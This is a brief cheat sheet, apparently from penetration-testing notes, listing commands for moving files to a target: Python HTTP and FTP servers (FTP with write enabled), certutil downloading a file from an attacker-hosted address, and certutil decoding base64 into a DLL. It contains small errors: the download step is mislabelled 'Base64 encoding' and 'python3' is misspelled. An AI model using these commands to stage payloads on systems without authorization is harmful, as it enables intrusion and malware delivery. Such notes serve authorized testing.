### Python SimpleHTTPServer
```c
python -m SimpleHTTPServer <local_port>
```
### Python3 HTTP Server
```c
pyhton3 -m http.server <local_port>
```
### Simple FTP Server
```c
python -m pyftpdlib -p 21 --write
```
### Certutil
Base64 encoding
```c
certutil.exe -urlcache -split -f "http://<local_ip>/<file>" <file>
```
Base64 decoding
```c
certutil.exe -decode <file>.txt <file>.dll
```
